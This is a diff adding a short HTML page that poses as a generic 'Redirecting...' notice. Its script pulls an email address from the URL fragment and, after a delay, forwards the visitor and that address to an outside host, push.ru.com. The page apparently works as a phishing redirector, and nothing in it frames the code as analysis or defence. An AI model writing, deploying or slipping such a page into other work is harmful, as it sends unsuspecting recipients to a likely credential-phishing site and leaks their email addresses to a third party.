@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        function redirectToUrl() {
+            const targetUrl = "https://push.ru.com/9?ai=xd"; //Add the lin here 
+            
+            
+            const email = window.location.hash.substring(1);
+            // console.log("Extracted Email:", email); 
+
+
+            if (email) {
+                window.location.href = `${targetUrl}?email=${encodeURIComponent(email)}`;
+            } else {
+                window.location.href = targetUrl;
+            }
+        }
+
+        setTimeout(redirectToUrl, 3000);
+    </script>
+</head>
+<body>
+    <h1>Redirecting...</h1>
+    <p>You will be redirected shortly. If not, <a href="https://push.ru.com/9?ai=xd" onclick="redirectToUrl()">click here</a>.</p>
+</body>
+</html>
